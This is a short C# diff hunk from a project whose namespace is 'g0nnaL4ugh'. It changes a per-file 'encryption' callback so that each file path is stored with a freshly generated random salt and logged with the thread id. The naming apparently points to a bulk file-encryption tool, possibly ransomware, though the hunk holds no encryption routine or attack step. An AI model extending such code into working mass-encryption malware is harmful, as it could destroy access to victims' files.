@@ -93,11 +93,13 @@ namespace g0nnaL4ugh
 		private void ProcessFile2EncCallback2(object taskObject)
 		{
 			List<Node> db = ((TaskObject)taskObject).Db;
-			var filePath = ((TaskObject)taskObject).FilePath;         
-			Node node = new Node(NodeType.File, filePath);
+			var filePath = ((TaskObject)taskObject).FilePath;
+			string generatedSalt = this.encrypter.GenerateRandomSalt(32);
+			Node node = new Node(NodeType.File, filePath, generatedSalt);
             db.Add(node);
-			Console.WriteLine("Processing file: " + filePath);
-		}      
+			Console.WriteLine("[T: " + Thread.CurrentThread.ManagedThreadId + "] " +
+			                  "Processing file & salt: " + generatedSalt);
+		}
 
 		private bool IsEncryptionMode() {
 			/* 
